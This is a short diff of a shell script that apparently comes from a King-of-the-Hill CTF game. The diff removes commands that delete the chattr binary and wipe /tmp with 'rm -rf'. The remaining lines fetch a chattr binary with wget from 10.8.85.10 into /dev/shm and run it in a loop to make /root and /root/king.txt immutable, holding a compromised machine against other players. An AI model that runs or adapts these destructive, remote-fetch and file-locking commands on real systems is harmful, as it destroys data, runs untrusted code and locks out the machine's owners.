@@ -1,8 +1,3 @@
-rm -rf $(which chattr)
-clear_tmp(){
-cd /tmp
-rm -rf *
-}
 get_chattr(){
      cd /dev/shm
      wget 10.8.85.10/chattr
@@ -17,10 +12,6 @@ while true; do
           else
                get_chattr
           	echo DONE
-     fi
-     if ls -l /tmp
-          then
-               clear_tmp
      fi
      /dev/shm/asd -ia /root > /dev/null
      /dev/shm/asd -ia /root/king.txt >/dev/null
